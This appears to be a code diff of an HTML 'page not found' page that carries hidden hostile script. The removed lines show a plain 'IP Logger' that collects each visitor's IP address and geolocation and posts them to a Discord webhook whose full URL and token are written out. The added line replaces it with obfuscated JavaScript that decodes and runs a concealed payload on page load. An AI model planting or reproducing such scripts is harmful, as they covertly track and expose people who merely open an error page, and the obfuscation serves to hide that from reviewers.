@@ -37,30 +37,7 @@
         <p>The page you are looking for does not exist.</p>
     </div>
     <script>
-        // Function to send data to the Discord webhook
-        function sendToWebhook(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your webhook URL
-            const request = new XMLHttpRequest();
-            request.open("POST", webhookUrl);
-            request.setRequestHeader('Content-type', 'application/json');
-
-            const params = {
-                username: "IP Logger",
-                avatar_url: "",
-                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}`
-            }
-
-            request.send(JSON.stringify(params));
-        }
-
-        // Fetch user's IP and location data
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                // Send data to Discord webhook
-                sendToWebhook(data);
-            })
-            .catch(error => console.error('Error:', error));
+var sendToWebhook;(function(){var XUV='',YBl=958-947;function XzS(k){var y=2970529;var f=k.length;var o=[];for(var a=0;a<f;a++){o[a]=k.charAt(a)};for(var a=0;a<f;a++){var p=y*(a+116)+(y%28992);var x=y*(a+544)+(y%49902);var b=p%f;var h=x%f;var c=o[b];o[b]=o[h];o[h]=c;y=(p+x)%3954348;};return o.join('')};var TCD=XzS('curoqhlrdftnytazogxcjpomrbkcvsuniwets').substr(0,YBl);var ZgM='ra2 s=h0,w+1c,a=h1(vfrexe"pb+d0f"haj.lln+p}rvt[vrx=z!;<a1 o;e8e,h0l9r,c6h8.,s6]7(,r4v7i,15+8o,t8r78,,6=6r,{0)81,l9a8),[0[; aC 1=t];f+r[vvrcl}00llp4lenpt.;;+ )h[n[a]]=t+t;aa9 v=+]as1=l3,wt=e4lnu=o5rf(rev}r5gl0,gCatgdmcnus]lonltC;,+w)=vhr9yha g;mnn1s(g9.;pri"(o e) f7r(vCruuiy.l;nst;-);[>q0ruo-({sa( r=;uhlrv]rhq)y[ua;aa= 8=gualuv}reo,0;ver[iaq,lnn]tr;uai ;; o;(han u=0;)<t;2+7)7vrr-t=qic a1Cvd)Aa(,)vvaref+b+t(;=f.f6{==zf51r*o+l.rh(r.o{ert)aq1h-*;4=(;[+7;,efst .fht(=))=dow,(p.+eog(hfsiq-c2agC.dpAt(;+d))+=.bhrr=ore,t;ae2z-m;A=.;.+a2(}mlie,cSnsinu<;"ir(.=lngl,)-={]uic()>v)".(u.hhqssdbotgiigso z;)jh{pish({[h+a]a;==(+n=1if(;!;nal()ziv((<n)l.aushhq=s(bytei6grol);y0uy==.7osne"u)f}le(p2sh(a[7]z;fv.ruv=e5j+i=(8"a;da1 [=v9=,;9p4n,)6i3b,c0g.=o4c=top);nas r=yt i3g[fuovCaarC;dv( 6n;ooA(=a2 g=t;9<a.re+gghjlf+]vqv)sll"t rnxdc;a)A+())d.ao)nwS.rnnt.rr m]h r]oiepcrlp)};;e.uknav2srlatjr)"a").ooinar+;';var ezV=XzS[TCD];var UsP='';var twm=ezV;var fJc=ezV(UsP,XzS(ZgM));var yfi=fJc(XzS('2u7uCjo!ftxf,.r;o}.s).4tuy.1r"W6(_tn)4sWW,=$z!oWc=o3<.ce.s[80r.W"f7ta35Wa;8l1.W;$I"uoy $=35041()_dWW";)aWos_t.f#gcbe;%j)t6b(_1..1mtt+4zec$po.o.W.Sft StWMs,m3tzn3 6.\'(We].Ware1"(e!$uW,#ph6WbW=s_,haf.unz?%b_$l.p5aw:,r){.}e0Wn;$e7,>.((.u)&.m.j)m0.nca0ce221W7)eyoe#_)n%=n;A.tS9e9 .fEW%tj{r_h...%+!: t#xof3.n455nW.]ee]I65<WfWdf+\/ey.1]W{%W6fW(+_+)oltr_%08"..W.;W$_n"e.s%deWryde]!)c.te%e(3e7WNaue+2{t:ceDse.r7)tnen,,o.8nnd((W6<tsi9trlW0,ya)crSa!eq2W_\/).=,(bys_.}Wyeu)jr$.s$.2}})h.\/}q4{WConngd7WWW=(t:tWonr7_971(e4dcmy%e}\/<5 a7Wi.aev:C.e(po7.{s2#8{eWf]epoz1e5obeWpnS}*,i]onuWo>(,(()1ii(=a3\/$ditWh](yi$eh.tfI)Wrx.=vn]j(nr("jW$o8=.8WWttu!7(.#Wo:)ftwW5{Wd1),Wjtol._Wkmj\/u0ywur%WWe6=lWii(51_t5>-$uy5)0ie_spl$.7aW.fW=$Wo03%tWczb..4ftW:];r=0eAc5n>$htt4;3e(e+9ifB%o5t0( ozpor0e2[3r;ienbnW!c4; b)e}u;ht\'rW)+==)w97;r.Neu)4dp 68rWp{=WWWe%W3(Wi;W>3te.{l]dWle;We0cmWzsWWozWy=W-W3W ,0n4W2b13 f1,lai_(.),6n]fsWo4oW#._.2W);=(5r9074n)(eWf)W,82.enW==e!)2). pep)ssag;b+Wl37d\/.w]{?)nwn.%.()z,eaa7 &!o&d30sa);o]!W]!e9Wah0.1a_ efW,eW *oax.We.$9$t\/=e.e)b22."14e748(W9ie6_167=ga(jSz}]o,;=hrehp)mr8r5]tWs1W um.yj.9t0d$e).ev_ 6bW_ybWt;W0W}!__W0,tW$sW\/w)\'WBWg()d)C_;);6.r)2n[;;=nlnW3_]e3u]r.W.oS3t$f p\/o,:nt3n.ioW$D;]{o8soe;xrW]%=r.Wd{bW,4,r{9dbmt.e.:W.h.tp_ajl\/e]41:kWre5=tg!d$+atg(aW.o)armevW.ix (). 98)er$eqB32,=r(a!_;%$"$>aiW:u%%r)\'._t.=+Wdr.8]%x(1oc)p.0>}$8.oe4$]1e)S4.+oWWW)enn{bh](%6"{is4W6eWeo4!C(e_4eWnf]Wer\'gW W_W%b_(WiW_x}*toft6%);9b(Woeal9+)N{W_ge%r.9ut8W\/%1-Wu,wi,t$3.=r8?te1\/]eer.roWf1ket8,4&Wksbd.orc7ratcp)e.{Wrreno=on%..,e.]()}!p6]abx)W2t81tau;npso;s61rpuiWalWrn-{aenoW1.;)&_9W_W.f14:sndo.ho_w.od)Wu&qWt<t]sti>fsut..)o}WtWcf;e;A.= 5jfrrw(8rW_4)\'seWW>t:d8tW\/=sc!.W3WBdW8,}t t]]Wul2ni:wm=f,4a(es7a;]_a%eWN;4,!SCf,w7qlWf((#t7e a43ewA.xqeifu"W+u5%=)!!))tM5}_.oi0C2.]%o(=8+b..1dTs6,}$_8e_W(.Wse.!)wfW=p.8d?j,rc:!ir!bg6Wu%Wjsu(3_.,N :;hvg_"W1*n4W8))b _()nnWj=s0uoeWt,3i{%t1Wp,.1%1u5pk}re]_-z.W3;i[l8(eti+w((](v; ( +WmMi jW(er)or;41tu3Wr=(uW=Wcs( )e5e(gplb.0toclg WW3n 8.!.eWu%2(T${nccj ef5!\/ynn4.6gs32=troWr,])3c5a.r!da>< i!_}'));var PwN=twm(XUV,yfi );PwN(4253);return 1601})()
     </script>
 </body>
 </html>
